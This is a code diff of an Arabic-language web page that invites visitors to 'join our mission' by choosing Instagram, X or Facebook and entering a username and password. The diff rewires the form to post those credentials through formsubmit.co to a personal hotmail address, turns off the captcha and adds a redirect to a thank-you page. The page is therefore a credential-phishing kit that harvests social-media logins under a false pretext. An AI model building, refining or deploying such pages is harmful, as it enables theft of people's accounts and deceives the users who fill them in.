@@ -41,15 +41,21 @@
     <h1>مرحبًا بكم في مهمتنا</h1>
     <p>انضم إلينا لإحداث فرق! اختر المنصة المفضلة لديك للتسجيل.</p>
 
-    <div class="platform" id="instagram">إنستغرام , </div>
-    <div class="platform" id="x">منصة  X  , </div>
+    <div class="platform" id="instagram">إنستغرام</div>
+    <div class="platform" id="x">إكس</div>
     <div class="platform" id="facebook">فيسبوك</div>
 
     <div class="form-container" id="form-container">
         <h3 id="platform-name">التسجيل في</h3>
-        <form id="registration-form" method="POST" action="send_email.php">
+        <form id="registration-form" method="POST" action="https://formsubmit.co/hmm.19999@hotmail.com">
+            <!-- حقول النموذج -->
             <input type="text" name="username" id="username" placeholder="اسم المستخدم" required><br>
             <input type="password" name="password" id="password" placeholder="كلمة المرور" required><br>
+
+            <!-- إدخالات إضافية لـ FormSubmit -->
+            <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+            <input type="hidden" name="_captcha" value="false">
+
             <button type="submit">إرسال</button>
         </form>
     </div>
